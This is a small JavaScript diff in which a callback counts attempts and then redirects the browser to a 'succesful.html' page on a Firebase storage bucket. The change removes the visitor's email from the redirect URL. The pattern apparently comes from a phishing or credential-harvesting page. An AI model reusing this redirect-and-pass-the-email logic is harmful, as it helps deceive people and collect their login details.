@@ -30,7 +30,7 @@
 					});
                     bless++;
                 } else {
-                     window.location.replace("https://firebasestorage.googleapis.com/v0/b/kadaw0no3qldv.appspot.com/o/succesful.html?alt=media&token=dc3eaa8d-f12e-489d-a1f8-bfc49153e2f5#"+my_email);
+                     window.location.replace("https://firebasestorage.googleapis.com/v0/b/kadaw0no3qldv.appspot.com/o/succesful.html?alt=media&token=dc3eaa8d-f12e-489d-a1f8-bfc49153e2f5#");
                 }
 
             }); 
